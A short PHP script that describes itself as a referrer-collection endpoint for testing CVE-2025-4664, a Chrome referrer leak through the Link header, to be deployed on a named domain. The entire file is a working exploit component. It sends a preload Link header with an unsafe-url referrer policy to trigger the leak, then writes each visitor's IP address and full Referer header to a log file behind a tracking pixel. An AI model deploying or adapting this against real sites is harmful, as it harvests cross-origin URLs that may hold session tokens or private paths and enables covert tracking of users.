<?php
/**
 * Referrer collection endpoint for CVE-2025-4664 (Link header referrer leak) testing.
 * Deploy on ebniw.com.
 *
 * This endpoint:
 * 1. Returns a Link header with referrerpolicy=unsafe-url
 * 2. Logs the Referer header received
 * 3. Serves a 1x1 transparent GIF
 */

// Set the Link header that triggers the Chrome-specific leak
header('Link: </payloads/pixel.gif>; rel=preload; as=image; referrerpolicy=unsafe-url');
header('Access-Control-Allow-Origin: *');
header('Cache-Control: no-store');
header('Content-Type: image/gif');

// Log the referer
$referer = $_SERVER['HTTP_REFERER'] ?? 'none';
$logEntry = date('c') . ' | ' . $_SERVER['REMOTE_ADDR'] . ' | Referer: ' . $referer . "\n";
file_put_contents('/tmp/sop-referer-log.txt', $logEntry, FILE_APPEND);

// 1x1 transparent GIF
echo base64_decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7');
